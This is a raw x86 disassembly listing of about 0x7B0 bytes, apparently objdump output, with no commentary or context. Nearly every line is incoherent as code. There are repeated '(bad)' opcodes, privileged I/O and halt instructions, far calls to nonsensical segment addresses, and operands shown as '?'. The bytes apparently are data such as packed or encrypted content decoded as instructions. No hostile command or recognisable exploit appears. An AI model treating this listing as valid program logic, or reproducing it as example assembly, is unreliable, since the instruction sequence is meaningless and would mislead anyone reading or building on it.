  414dba:	jae    0x414da5
  414dbc:	sti    
  414dbd:	adc    ebx,edi
  414dbf:	adc    ecx,ecx
  414dc1:	lods   al,BYTE PTR ds:[esi]
  414dc2:	xchg   ebp,ecx
  414dc4:	or     dl,BYTE PTR [eax-0x6]
  414dc7:	or     al,0x33
  414dc9:	and    DWORD PTR [ecx],ebp
  414dcb:	pushf  
  414dcc:	enter  0xea29,0xf1
  414dd0:	and    al,0xb7
  414dd2:	and    ecx,DWORD PTR [ebp-0x3b92b19a]
  414dd8:	arpl   WORD PTR [eax],bx
  414dda:	iret   
  414ddb:	mov    bh,0xe2
  414ddd:	shr    DWORD PTR [esi-0x1d7d6b0],cl
  414de3:	mov    al,0xdd
  414de5:	adc    edx,esi
  414de7:	iret   
  414de8:	lods   eax,DWORD PTR ds:[esi]
  414de9:	ret    0x356d
  414dec:	or     eax,0xdf6345ea
  414df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414df2:	adc    cl,ch
  414df4:	sar    ecx,1
  414df6:	ficom  WORD PTR [edx*8-0x6b4a96f0]
  414dfd:	fst    QWORD PTR [eax+0x98bd65d]
  414e03:	repz push 0xe968d528
  414e09:	push   eax
  414e0a:	and    DWORD PTR [edx],eax
  414e0c:	sbb    BYTE PTR [edx-0x1cedadcb],0xf0
  414e13:	or     edi,eax
  414e15:	(bad)  
  414e16:	ins    BYTE PTR es:[edi],dx
  414e17:	xchg   edx,esi
  414e19:	sub    ch,BYTE PTR [ebp-0x43469de8]
  414e1f:	gs jmp 0x4029ff07
  414e25:	enter  0x43f5,0x8
  414e29:	cmp    ecx,DWORD PTR [edi-0x53]
  414e2c:	or     BYTE PTR [ecx-0x68],cl
  414e2f:	repz fsub QWORD PTR [edx+eax*8+0x5c67611]
  414e37:	mov    edx,0xa7f4c597
  414e3c:	add    DWORD PTR [edi+edx*2-0xec76f19],edi
  414e43:	pushf  
  414e44:	inc    eax
  414e45:	call   0x65f9:0x1599a508
  414e4c:	mov    al,al
  414e4e:	enter  0x6177,0xdf
  414e52:	xor    DWORD PTR [ecx+eax*2],edi
  414e55:	fprem1 
  414e57:	add    ch,BYTE PTR [ebp-0x20]
  414e5a:	jbe    0x414dec
  414e5c:	push   edi
  414e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e5e:	push   0x24
  414e60:	(bad)  
  414e61:	mov    esi,0xb2dbae47
  414e66:	pop    ebp
  414e67:	adc    al,0xff
  414e69:	dec    ecx
  414e6a:	cmp    dl,BYTE PTR [ebp+0x4f82b2a0]
  414e70:	mov    esp,DWORD PTR [ebx+0x6d]
  414e73:	jl     0x414e1a
  414e75:	in     al,0x4b
  414e77:	sahf   
  414e78:	pop    ss
  414e79:	data16 data16 jg 0x414e79
  414e7d:	int3   
  414e7e:	and    DWORD PTR [edx],ebp
  414e80:	mov    esp,0xae771699
  414e85:	dec    ecx
  414e86:	popa   
  414e87:	jae    0x414e2f
  414e89:	rcl    esp,cl
  414e8b:	push   edx
  414e8c:	mov    WORD PTR [ebx+0x76b06cf8],?
  414e92:	add    ah,BYTE PTR [edx-0x3d6d1947]
  414e98:	sbb    bh,bl
  414e9a:	jnp    0x414ebb
  414e9c:	adc    DWORD PTR [edx+0x3391ea6],ebx
  414ea2:	clc    
  414ea3:	sub    bl,al
  414ea5:	pop    ss
  414ea6:	cmp    al,BYTE PTR [edx-0x3d]
  414ea9:	out    0xaf,eax
  414eab:	jnp    0x414e43
  414ead:	(bad)  
  414eae:	push   ss
  414eaf:	sub    DWORD PTR [eax+edx*2+0x22],0xffffffdd
  414eb4:	gs repnz adc eax,0x2af4b2ed
  414ebb:	push   ds
  414ebc:	or     ah,dl
  414ebe:	and    eax,0xfca18fc7
  414ec3:	lahf   
  414ec4:	bound  esp,QWORD PTR [ebx+edi*4+0x4c]
  414ec8:	test   al,0x6b
  414eca:	fidiv  DWORD PTR [edx-0x3391e8fe]
  414ed0:	les    edx,FWORD PTR [edx]
  414ed2:	cs dec ecx
  414ed4:	(bad)  
  414ed5:	ja     0x414ee8
  414ed7:	and    BYTE PTR [eax+0xea90fca],bh
  414edd:	(bad)  
  414ede:	(bad)  [edx+0x7d]
  414ee1:	int    0x4e
  414ee3:	inc    ecx
  414ee4:	jb     0x414ea5
  414ee6:	mov    al,0x59
  414ee8:	mov    al,0x72
  414eea:	push   esp
  414eeb:	fnsave [edi]
  414eed:	push   edx
  414eee:	(bad)  [esi-0x35]
  414ef1:	xchg   edi,eax
  414ef2:	icebp  
  414ef3:	mov    bl,0x9d
  414ef5:	cmp    ch,BYTE PTR [edx-0x15add62f]
  414efb:	jmp    0x414efd
  414efd:	push   ebp
  414efe:	and    DWORD PTR [ebx+0x5e],edx
  414f01:	data16 in al,0x8d
  414f04:	dec    ecx
  414f05:	mov    dl,0xca
  414f07:	shl    DWORD PTR ds:0xbb57756e,0xf1
  414f0e:	jmp    0x8ed8b988
  414f13:	call   0xf299:0xd66d4ce2
  414f1a:	sahf   
  414f1b:	xchg   edi,eax
  414f1c:	jecxz  0x414eb7
  414f1e:	ds pop esp
  414f20:	ret    0xef70
  414f23:	retf   0x5caa
  414f26:	or     eax,0x55636f0
  414f2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f2c:	or     al,0x90
  414f2e:	int    0xf9
  414f30:	dec    esp
  414f31:	push   0x9fb8f236
  414f36:	mov    edx,0x28664924
  414f3b:	mov    ch,0xbb
  414f3d:	repz cs hlt 
  414f40:	add    eax,0x9ecda472
  414f45:	sbb    BYTE PTR [eax+0x19],dh
  414f48:	jns    0x414edf
  414f4a:	or     eax,0xaf2227c8
  414f4f:	push   0xffffffe8
  414f51:	mov    esp,0x1485f7a4
  414f56:	loope  0x414f42
  414f58:	push   ecx
  414f59:	mov    fs,ecx
  414f5b:	icebp  
  414f5c:	xchg   edi,eax
  414f5d:	lahf   
  414f5e:	and    ebx,eax
  414f60:	sar    BYTE PTR [eax+0x24],cl
  414f63:	inc    ebp
  414f64:	mov    ch,0xf0
  414f66:	sahf   
  414f67:	rcl    dh,cl
  414f69:	sub    edx,DWORD PTR [ecx+0x63]
  414f6c:	leave  
  414f6d:	xor    edi,DWORD PTR [eax+edi*4+0x629d7071]
  414f74:	dec    ecx
  414f75:	ret    
  414f76:	(bad)  
  414f77:	mov    ebx,0x458431ec
  414f7c:	test   DWORD PTR [ebp-0x63d2978],ebp
  414f82:	jo     0x414f29
  414f84:	iret   
  414f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f86:	enter  0x3ccd,0xa0
  414f8a:	(bad)  
  414f8b:	jo     0x414f39
  414f8d:	in     eax,dx
  414f8e:	push   ss
  414f8f:	lods   al,BYTE PTR ds:[esi]
  414f90:	xchg   bh,ch
  414f92:	js     0x414f2d
  414f94:	lods   eax,DWORD PTR ds:[esi]
  414f95:	jae    0x414fbd
  414f97:	popa   
  414f98:	or     BYTE PTR [ebx+0x7c],bl
  414f9b:	jmp    0x4eaa:0x2cfea16c
  414fa2:	lea    edx,ds:0x37964742
  414fa8:	pop    ecx
  414fa9:	pop    sp
  414fab:	sahf   
  414fac:	js     0x414f77
  414fae:	add    esi,esi
  414fb0:	mov    ds:0xdad3eece,al
  414fb5:	mov    eax,0xbb2eeaee
  414fba:	jle    0x414fe4
  414fbc:	in     al,0xf5
  414fbe:	lods   al,BYTE PTR ds:[esi]
  414fbf:	scas   al,BYTE PTR es:[edi]
  414fc0:	dec    esp
  414fc1:	stc    
  414fc2:	dec    esp
  414fc3:	rcr    DWORD PTR [ebx+0x54],0x7f
  414fc7:	pop    eax
  414fc8:	gs or  al,0x66
  414fcb:	mov    esi,0x3b29ae62
  414fd0:	xor    esi,DWORD PTR [ecx+0x4a]
  414fd3:	mov    ds:0x4be5745f,eax
  414fd8:	cmp    BYTE PTR [ecx+0x29],0xf3
  414fdc:	xchg   esi,eax
  414fdd:	pop    ss
  414fde:	inc    ebx
  414fdf:	iret   
  414fe0:	add    eax,0xda086abb
  414fe5:	and    bh,BYTE PTR [esp+ebx*2-0x6c]
  414fe9:	loope  0x415032
  414feb:	mov    ebp,0x93983950
  414ff0:	clc    
  414ff1:	mov    esi,0x9f946429
  414ff6:	pop    es
  414ff7:	xchg   edx,eax
  414ff8:	sti    
  414ff9:	mov    ah,dl
  414ffb:	and    al,0x3b
  414ffd:	int    0x7a
  414fff:	pop    es
  415000:	aaa    
  415001:	adc    DWORD PTR [edx],ebp
  415003:	jl     0x414f91
  415005:	dec    ebp
  415006:	pop    edx
  415007:	pop    esi
  415008:	mov    cl,BYTE PTR ds:0xfd03
  41500d:	pop    esp
  41500e:	arpl   WORD PTR [ebx-0x3dc306f1],sp
  415014:	adc    DWORD PTR [edx-0x1d],edx
  415017:	icebp  
  415018:	lea    eax,[eax+0x6ea414c7]
  41501e:	adc    BYTE PTR [eax+eiz*4],ah
  415021:	mov    dl,0xf
  415023:	xchg   edx,eax
  415024:	(bad)  
  415025:	not    DWORD PTR [eax]
  415027:	test   bh,bh
  415029:	out    0x16,al
  41502b:	push   cs
  41502c:	inc    ebx
  41502d:	loope  0x415020
  41502f:	xor    eax,DWORD PTR [ecx-0x418496e8]
  415035:	dec    ebx
  415036:	jo     0x414fdf
  415038:	push   cs
  415039:	fidivr WORD PTR [edi+0x7fddb187]
  41503f:	inc    ebp
  415040:	mov    cl,0x37
  415042:	enter  0x694b,0x97
  415046:	cmp    bl,BYTE PTR [ecx]
  415048:	jg     0x415048
  41504a:	out    0x30,eax
  41504c:	mov    edi,0xa3a6d2f3
  415051:	mov    ah,ah
  415053:	jae    0x415045
  415055:	push   esi
  415056:	adc    al,0x5
  415058:	or     bl,BYTE PTR [ecx+0x7ad2641e]
  41505e:	out    0xbc,eax
  415060:	cmp    DWORD PTR [edi-0x50e874dd],edx
  415066:	or     al,0x9b
  415068:	adc    al,0x88
  41506a:	xchg   esi,eax
  41506b:	ins    DWORD PTR es:[edi],dx
  41506c:	sbb    DWORD PTR [edx+0x585a27e2],ebx
  415072:	xchg   ecx,eax
  415073:	into   
  415074:	jmp    0x41504d
  415076:	les    esi,FWORD PTR [edx+0x28]
  415079:	popa   
  41507a:	jne    0x41500b
  41507c:	out    dx,al
  41507d:	aas    
  41507e:	mov    ebx,0x2a845d47
  415083:	and    DWORD PTR [esi-0x18],edx
  415086:	(bad)  
  415088:	cld    
  415089:	and    BYTE PTR [ebp-0xd],cl
  41508c:	ss retf 
  41508e:	mov    fs,WORD PTR [ecx-0xf]
  415091:	(bad)  
  415092:	dec    ecx
  415093:	bound  esp,QWORD PTR [ebx+0x5]
  415096:	or     ebx,esp
  415098:	add    eax,0x4028ecba
  41509d:	icebp  
  41509e:	xlat   BYTE PTR ds:[ebx]
  41509f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150a0:	je     0x415078
  4150a2:	push   eax
  4150a3:	mov    cl,cl
  4150a5:	fs push ecx
  4150a7:	pop    edx
  4150a8:	jge    0x415051
  4150aa:	mov    dh,0xf9
  4150ac:	outs   dx,DWORD PTR ds:[esi]
  4150ad:	loop   0x41505a
  4150af:	pop    ebp
  4150b0:	les    esi,FWORD PTR [edi-0x6c]
  4150b3:	sub    eax,0xaf0a6821
  4150b8:	sub    al,BYTE PTR [edx-0x1b]
  4150bb:	std    
  4150bc:	cmp    BYTE PTR [edx-0x3b],0x94
  4150c0:	call   0x1a6803d1
  4150c5:	push   edi
  4150c6:	test   al,0xc8
  4150c8:	cmp    ecx,ebx
  4150ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150cb:	xlat   BYTE PTR ds:[ebx]
  4150cc:	sbb    eax,0x6fca56e2
  4150d1:	inc    esp
  4150d2:	loopne 0x4150e8
  4150d4:	ds ins BYTE PTR es:[edi],dx
  4150d6:	adc    BYTE PTR ds:0x78666170,dh
  4150dc:	sar    BYTE PTR [esi+ebp*1],cl
  4150df:	clc    
  4150e0:	jg     0x41506d
  4150e2:	mov    ds:0x477d54d9,eax
  4150e7:	mov    ds:0x5b797727,eax
  4150ec:	repz cmp DWORD PTR [edi-0x55f21ad],eax
  4150f3:	bound  esi,QWORD PTR [eax+0x62]
  4150f6:	retf   
  4150f7:	xor    al,0x22
  4150f9:	pop    ecx
  4150fa:	lods   al,BYTE PTR ds:[esi]
  4150fb:	or     al,0x66
  4150fd:	pop    ecx
  4150fe:	push   edi
  4150ff:	cdq    
  415100:	mov    gs,WORD PTR [ecx-0x39ca27a9]
  415106:	mov    ebx,0x65cdb095
  41510b:	push   0xffffff90
  41510d:	out    dx,eax
  41510e:	xchg   BYTE PTR [eax],cl
  415110:	sbb    ecx,DWORD PTR [ebp-0x6b8d6b4c]
  415116:	mov    ebx,0x179a33cc
  41511b:	sbb    al,0x52
  41511d:	push   esp
  41511e:	sti    
  41511f:	mov    dh,0xdc
  415121:	jnp    0x41517e
  415123:	lock pop es
  415125:	out    dx,al
  415126:	and    bh,BYTE PTR [eax]
  415128:	adc    eax,DWORD PTR [ebp+0x670cf3a4]
  41512e:	pop    esi
  41512f:	ds dec al
  415132:	test   BYTE PTR [ebx],0xcf
  415135:	and    eax,0x1fc721bf
  41513a:	jge    0x4150fa
  41513c:	aad    0xd2
  41513e:	dec    eax
  41513f:	or     eax,0x14a854b8
  415144:	repnz into 
  415146:	(bad)  
  415147:	shl    DWORD PTR [edi+ebx*1-0x3f],1
  41514b:	or     BYTE PTR [edx+eax*1],dh
  41514e:	cwde   
  41514f:	aas    
  415150:	in     al,0x38
  415152:	pop    ebx
  415153:	loope  0x4151b4
  415155:	fcomp  DWORD PTR [edi+0x38]
  415158:	jp     0x415133
  41515a:	in     eax,0x42
  41515c:	lods   eax,DWORD PTR ds:[esi]
  41515d:	fdivrp st(1),st
  41515f:	fistp  DWORD PTR [ebp+0x4701d3ca]
  415165:	sbb    BYTE PTR [edx],ah
  415167:	mov    BYTE PTR [edx-0x4a],al
  41516a:	mov    edx,?
  41516c:	rcr    edx,cl
  41516e:	out    0x86,al
  415170:	lea    ebp,[eax]
  415172:	fs cld 
  415174:	(bad)  
  415175:	not    BYTE PTR [eax]
  415177:	xchg   ecx,eax
  415178:	xchg   esi,eax
  415179:	sar    BYTE PTR [esi+0x1b03f4be],1
  41517f:	aas    
  415180:	pop    edi
  415181:	inc    ebp
  415182:	imul   al
  415184:	or     eax,0x3f07626b
  415189:	sti    
  41518a:	xor    BYTE PTR [edx-0x72],0x8c
  41518e:	cld    
  41518f:	scas   al,BYTE PTR es:[edi]
  415190:	pop    ds
  415191:	aaa    
  415192:	jae    0x415154
  415194:	nop
  415195:	outs   dx,DWORD PTR ds:[esi]
  415196:	fisubr DWORD PTR [edi]
  415198:	pop    ss
  415199:	call   0x867bd345
  41519e:	jl     0x415157
  4151a0:	daa    
  4151a1:	outs   dx,DWORD PTR ds:[esi]
  4151a2:	clc    
  4151a3:	js     0x415187
  4151a5:	sub    BYTE PTR [edi],ah
  4151a7:	inc    edx
  4151a8:	out    0x83,eax
  4151aa:	mov    ds:0x3b55bc1b,al
  4151af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151b0:	cwde   
  4151b1:	push   esi
  4151b2:	and    ecx,DWORD PTR [eax]
  4151b4:	mov    BYTE PTR [ebx],cl
  4151b6:	xlat   BYTE PTR ds:[ebx]
  4151b7:	stos   DWORD PTR es:[edi],eax
  4151b8:	adc    BYTE PTR [edi],al
  4151ba:	dec    esi
  4151bb:	call   0x9bec:0x58507bfc
  4151c2:	inc    esi
  4151c3:	imul   BYTE PTR [edx+ebp*8]
  4151c6:	std    
  4151c7:	jno    0x4151cc
  4151c9:	xor    BYTE PTR [edx],dl
  4151cb:	jbe    0x415199
  4151cd:	into   
  4151ce:	sbb    al,0xda
  4151d0:	fdiv   QWORD PTR [edi+ebx*1+0x2]
  4151d4:	std    
  4151d5:	jae    0x4151f4
  4151d7:	in     al,dx
  4151d8:	call   0x489f71bd
  4151dd:	lds    edx,FWORD PTR [ebp*2-0x61ff20d0]
  4151e4:	and    BYTE PTR [edx+0x7027df4c],cl
  4151ea:	fs in  eax,dx
  4151ec:	cmp    ebx,DWORD PTR [edx+0x74]
  4151ef:	cmp    ch,BYTE PTR [ebp+0x45]
  4151f2:	mov    edx,DWORD PTR [ecx]
  4151f4:	push   ss
  4151f5:	scas   al,BYTE PTR es:[edi]
  4151f6:	sub    BYTE PTR [ebx],cl
  4151f8:	jecxz  0x41518e
  4151fa:	idiv   BYTE PTR [ebx]
  4151fc:	les    ebp,FWORD PTR [esi+0x45459da2]
  415202:	xor    BYTE PTR [ebx+edx*4+0x43],bl
  415206:	mov    WORD PTR [edx+0x6b262664],gs
  41520c:	imul   esi,DWORD PTR [ecx-0x37],0xb6d7bc97
  415213:	mov    ?,WORD PTR [ebx+0x3b]
  415216:	cmp    DWORD PTR [ebx],0xa9e2f909
  41521c:	cmp    eax,DWORD PTR [ebx]
  41521e:	lds    edx,FWORD PTR [edx-0x7b]
  415221:	loopne 0x4151ef
  415223:	jle    0x4151d4
  415225:	mul    ebx
  415227:	xor    ebp,DWORD PTR [edx]
  415229:	cs jecxz 0x41524d
  41522c:	xchg   DWORD PTR [ebp+0x1a31fee3],esi
  415232:	sbb    al,0xbe
  415234:	out    0x17,eax
  415236:	pusha  
  415237:	shl    DWORD PTR [ebx-0xc996121],0xfc
  41523e:	xchg   edi,eax
  41523f:	ins    DWORD PTR es:[edi],dx
  415240:	into   
  415241:	dec    esi
  415242:	jmp    0x9c7b:0xb700f068
  415249:	mov    DWORD PTR [ebx+eiz*8],edi
  41524c:	data16 fidiv DWORD PTR [ebx]
  41524f:	out    0x4e,eax
  415251:	mov    ch,bl
  415253:	fwait
  415254:	dec    ebx
  415255:	cmp    al,0x2c
  415257:	leave  
  415258:	ret    
  415259:	dec    edi
  41525a:	mov    ch,0x29
  41525c:	nop
  41525d:	je     0x4151ea
  41525f:	pop    edi
  415260:	and    eax,0x84ceaecb
  415265:	jno    0x4152e5
  415267:	vpsubsw ymm3,ymm1,YMMWORD PTR [edx]
  41526b:	fistp  QWORD PTR [ecx-0x1a]
  41526e:	mov    eax,0xa500a8d1
  415273:	pop    eax
  415274:	pop    ebx
  415275:	pop    ecx
  415276:	(bad)  
  415277:	in     al,dx
  415278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415279:	cmp    edx,DWORD PTR [eax]
  41527b:	fcomp  DWORD PTR [ebp+0x667417ed]
  415281:	jl     0x41528a
  415283:	je     0x41528b
  415285:	test   eax,0x9d2de1fc
  41528a:	sbb    cl,dl
  41528c:	mov    ds,esp
  41528e:	adc    eax,0xc547a7d1
  415293:	ins    DWORD PTR es:[edi],dx
  415294:	push   0x14180f0d
  415299:	xchg   ecx,eax
  41529a:	or     esp,DWORD PTR [edx]
  41529c:	lahf   
  41529d:	pop    ss
  41529e:	inc    ecx
  41529f:	test   BYTE PTR [ebx-0x520686bc],dh
  4152a5:	sbb    ah,BYTE PTR ds:0xbc8d13fb
  4152ab:	mov    edx,0x13fc1514
  4152b0:	ss std 
  4152b2:	mov    DWORD PTR [eax],ebx
  4152b4:	out    dx,al
  4152b5:	inc    edi
  4152b6:	cmp    al,0x6c
  4152b8:	sub    eax,0x5f7a7f
  4152bd:	mov    ecx,0xe5c63ba8
  4152c2:	enter  0x58,0x1
  4152c6:	repnz in eax,0xdd
  4152c9:	adc    al,0xc3
  4152cb:	mov    eax,ds:0xdee695da
  4152d0:	and    eax,0x72479802
  4152d5:	cs or  al,0xb4
  4152d8:	mov    edx,0xae04bbcc
  4152dd:	mov    cl,0xd3
  4152df:	or     edi,DWORD PTR [edi+ebp*1]
  4152e2:	mov    edi,0xa6f82f88
  4152e7:	add    DWORD PTR [eax-0x5d004e56],ecx
  4152ed:	in     al,dx
  4152ee:	(bad)  
  4152ef:	push   esi
  4152f0:	clc    
  4152f1:	and    al,BYTE PTR [eax]
  4152f3:	jo     0x4152b2
  4152f5:	fld    TBYTE PTR [esi]
  4152f7:	push   ds
  4152f8:	cmp    BYTE PTR [eax+eiz*2-0x5a],dh
  4152fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152fd:	pushf  
  4152fe:	mov    edx,0x603169a7
  415303:	cmp    DWORD PTR ds:0xa8fb16cb,ebx
  415309:	and    ah,BYTE PTR [ebx]
  41530b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41530c:	lods   eax,DWORD PTR ds:[esi]
  41530d:	mov    esp,eax
  41530f:	lds    cx,DWORD PTR [ebp+0x1b8526f4]
  415316:	mov    ecx,0x342b029a
  41531b:	das    
  41531c:	imul   edi,DWORD PTR [eax],0x11
  41531f:	int    0x45
  415321:	mov    ds:0xb38a1042,eax
  415326:	push   0xfffffffa
  415328:	out    dx,al
  415329:	jmp    0x3f6b194c
  41532e:	ja     0x4153ac
  415330:	sub    DWORD PTR [edx],esp
  415332:	adc    al,0x1b
  415334:	xchg   ecx,eax
  415335:	pop    esp
  415336:	loope  0x4152ce
  415338:	aam    0x28
  41533a:	xchg   ecx,eax
  41533b:	sub    dh,BYTE PTR [eax-0x7e]
  41533e:	stos   DWORD PTR es:[edi],eax
  41533f:	mov    ecx,0x8da42d73
  415344:	sbb    eax,ebp
  415346:	inc    ebx
  415347:	xchg   esi,eax
  415348:	mov    DWORD PTR [ebp+0x4a0d7a16],ebx
  41534e:	jmp    0xec2a:0x315dfb33
  415355:	mov    dl,0x2c
  415357:	sti    
  415358:	loope  0x415344
  41535a:	and    BYTE PTR [edx-0x13],bl
  41535d:	dec    ebp
  41535e:	shl    DWORD PTR [edx+eiz*1],1
  415361:	mov    ch,0x2b
  415363:	pop    edx
  415364:	push   esp
  415365:	out    0xc1,al
  415367:	nop
  415368:	in     al,0xfc
  41536a:	int3   
  41536b:	sbb    DWORD PTR [esp+ebx*2],edx
  41536e:	add    ecx,DWORD PTR [edi+0x6d]
  415371:	add    al,0x8e
  415373:	and    BYTE PTR [ecx],cl
  415375:	ror    BYTE PTR [ecx-0x17],cl
  415378:	mov    cl,BYTE PTR [ecx]
  41537a:	clc    
  41537b:	call   0xbc4569d4
  415380:	inc    edx
  415381:	(bad)  
  415382:	(bad)  
  415383:	xor    al,0x37
  415385:	pop    ss
  415386:	xor    BYTE PTR [ebp+0x5f],bl
  415389:	mov    esi,0x35c0c602
  41538e:	(bad)  
  41538f:	cmp    ecx,ecx
  415391:	jae    0x415323
  415393:	xchg   ecx,eax
  415394:	out    0xe6,eax
  415396:	push   edx
  415397:	add    eax,DWORD PTR [eax+0x544ffbe1]
  41539d:	rcl    DWORD PTR [edx],cl
  41539f:	push   ecx
  4153a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153a1:	jns    0x415382
  4153a3:	xor    BYTE PTR [eax+esi*8],ah
  4153a6:	repnz xchg edx,eax
  4153a8:	push   esi
  4153a9:	or     BYTE PTR [edx+0x5a50c49e],0xfe
  4153b0:	mov    edx,0x6767a8f4
  4153b5:	dec    ebp
  4153b6:	adc    eax,0x1f63e541
  4153bb:	xor    dh,BYTE PTR [ebp+eiz*1+0x0]
  4153bf:	mov    ecx,edi
  4153c1:	adc    dh,BYTE PTR [ecx+0x5e4a0e8c]
  4153c7:	stc    
  4153c8:	lods   al,BYTE PTR ds:[esi]
  4153c9:	cwde   
  4153ca:	cmp    ebp,esi
  4153cc:	retf   
  4153cd:	pop    es
  4153ce:	ja     0x41537d
  4153d0:	sub    eax,0xd23429a4
  4153d5:	fsub   DWORD PTR [ebp-0xa76fabf]
  4153db:	test   DWORD PTR [edx],ecx
  4153dd:	dec    ecx
  4153de:	in     al,dx
  4153df:	push   esi
  4153e0:	push   0xf2a3a687
  4153e5:	cmp    BYTE PTR [esi],ah
  4153e7:	pop    es
  4153e8:	leave  
  4153e9:	sub    BYTE PTR [ecx+0x4588a3dd],dh
  4153ef:	inc    edx
  4153f0:	into   
  4153f1:	ds dec ebp
  4153f3:	xor    DWORD PTR [ecx-0x2a0fdb12],esp
  4153f9:	jns    0x4153b9
  4153fb:	dec    ecx
  4153fc:	cld    
  4153fd:	mov    ds:0x5b3b71d6,eax
  415402:	clc    
  415403:	jl     0x415465
  415405:	in     eax,0xda
  415407:	or     eax,0xa18d876f
  41540c:	outs   dx,DWORD PTR ds:[esi]
  41540d:	stos   DWORD PTR es:[edi],eax
  41540e:	test   al,0x2b
  415410:	inc    edi
  415412:	sahf   
  415413:	(bad)  
  415414:	aad    0xb1
  415416:	add    ebx,esi
  415418:	je     0x41548b
  41541a:	sub    DWORD PTR [ebx-0x710e6b21],0x3c
  415421:	test   eax,0x412a5429
  415426:	adc    BYTE PTR [esi],dh
  415428:	cli    
  415429:	test   DWORD PTR [esi-0x10],esp
  41542c:	mov    ah,BYTE PTR [ecx]
  41542e:	mov    eax,ds:0xdef6030a
  415433:	test   DWORD PTR [edx],0x6edaa11
  415439:	popf   
  41543a:	mov    BYTE PTR [ecx+0x7a],al
  41543d:	dec    esi
  41543e:	pop    ds
  41543f:	lock add ebp,esi
  415442:	call   0x947f:0x2448b068
  415449:	rcl    DWORD PTR [edi+eiz*4-0x4a],1
  41544d:	pusha  
  41544e:	xor    DWORD PTR [ebx+0x1ffad913],eax
  415454:	iret   
  415455:	sub    DWORD PTR [edi-0x1f],ebp
  415458:	mov    dh,0xb
  41545a:	out    dx,al
  41545b:	mov    ecx,0x45f60406
  415460:	aaa    
  415461:	(bad)  
  415462:	mov    ebx,ebp
  415464:	ds ja  0x4154d6
  415467:	xor    eax,0xf6df109
  41546c:	adc    BYTE PTR [edi],bh
  41546e:	sahf   
  41546f:	scas   eax,DWORD PTR es:[edi]
  415470:	in     al,0xc2
  415472:	push   ebx
  415473:	dec    ecx
  415474:	mov    ds:0xef788da9,eax
  415479:	sub    cl,0xda
  41547c:	push   ds
  41547d:	mov    ebp,0x44d05585
  415482:	xchg   DWORD PTR [edi+0x1c029710],ebx
  415488:	nop
  415489:	ficom  DWORD PTR [eax+0x7433f2ec]
  41548f:	cmp    edx,DWORD PTR [ebp-0x15]
  415492:	cmp    edx,DWORD PTR [ecx]
  415494:	call   0x200ce1f
  415499:	fs stos BYTE PTR es:[edi],al
  41549b:	mov    bh,0xd6
  41549d:	jns    0x415431
  41549f:	call   FWORD PTR [ebx]
  4154a1:	inc    esp
  4154a2:	stos   BYTE PTR es:[edi],al
  4154a3:	call   0xf361d4ee
  4154a8:	sub    ah,bh
  4154aa:	pop    ebp
  4154ab:	xor    eax,0x4a62eb4d
  4154b0:	sbb    DWORD PTR [eax-0x47],ebx
  4154b3:	jb     0x41552d
  4154b5:	rcr    ch,cl
  4154b7:	shl    DWORD PTR [esi+0x6f],0x1f
  4154bb:	pop    ecx
  4154bc:	sar    BYTE PTR [edi+0x12],cl
  4154bf:	add    dl,al
  4154c1:	shl    BYTE PTR [eax],0xa3
  4154c4:	and    eax,edi
  4154c6:	(bad)  
  4154c7:	out    dx,al
  4154c8:	cs push ebp
  4154ca:	or     eax,0x128f4e2c
  4154cf:	dec    ebp
  4154d0:	dec    ecx
  4154d1:	enter  0xe55,0x8
  4154d5:	sbb    al,0x40
  4154d7:	xchg   edi,eax
  4154d8:	xor    ebx,DWORD PTR [ebx]
  4154da:	sbb    esi,esp
  4154dc:	or     cl,BYTE PTR [eax-0x4b]
  4154df:	addr16 pop ebp
  4154e1:	js     0x4154a9
  4154e3:	xor    eax,0xd4c61bcd
  4154e8:	lds    esp,FWORD PTR [esi-0x4f]
  4154eb:	cmp    dh,BYTE PTR [edi+ecx*4-0xd]
  4154ef:	mov    al,0x8a
  4154f1:	fnstcw WORD PTR [ebx-0x59017acd]
  4154f7:	test   al,0x18
  4154f9:	rol    ch,1
  4154fb:	lods   al,BYTE PTR ds:[esi]
  4154fc:	addr16 push ss
  4154fe:	sub    eax,0xfffc3da4
  415503:	adc    eax,0x14578dbb
  415508:	xchg   ebx,eax
  415509:	lods   al,BYTE PTR ds:[esi]
  41550a:	dec    edx
  41550b:	xor    eax,0x28045e7a
  415510:	and    ecx,DWORD PTR [ebx]
  415512:	lods   eax,DWORD PTR ds:[esi]
  415513:	mov    dh,0xbb
  415515:	repz jl 0x41553f
  415518:	fld    st(1)
  41551a:	sahf   
  41551b:	pop    ds
  41551c:	inc    edi
  41551d:	sub    eax,0xa12cfdff
  415522:	xchg   esi,eax
  415523:	adc    ch,BYTE PTR fs:[edi+0x479062be]
  41552a:	pushf  
  41552b:	js     0x415501
  41552d:	xchg   edi,eax
  41552e:	dec    esp
  41552f:	adc    esi,DWORD PTR [edi]
  415531:	ss cmp eax,0xd0b38eb3
  415537:	mov    ds:0xc5ba9a1e,al
  41553c:	stos   DWORD PTR es:[edi],eax
  41553d:	sub    DWORD PTR [edx+eax*2+0x5],ebp
  415541:	arpl   bp,cx
  415543:	in     eax,dx
  415544:	mov    ds:0x61b2de73,al
  415549:	stc    
  41554a:	shl    DWORD PTR [ecx],0x5c
  41554d:	in     eax,0xa7
  41554f:	fucomp st(6)
  415551:	mov    bh,0x3e
  415553:	cwde   
  415554:	ins    BYTE PTR es:[edi],dx
  415555:	out    dx,al
  415556:	sbb    edi,edx
  415558:	dec    esi
  415559:	out    dx,al
  41555a:	jge    0x4155ba
  41555c:	outs   dx,DWORD PTR ds:[esi]
  41555d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41555e:	add    edx,edi
  415560:	pop    esi
  415561:	xor    dh,ch
  415563:	mov    al,ds:0xb050f98f
  415568:	jp     0x415544
  41556a:	ror    BYTE PTR [ecx],cl
  41556c:	outs   dx,DWORD PTR ds:[esi]
  41556d:	sbb    BYTE PTR [ebx+0x42],cl
  415570:	leave  
  415571:	stos   DWORD PTR es:[edi],eax
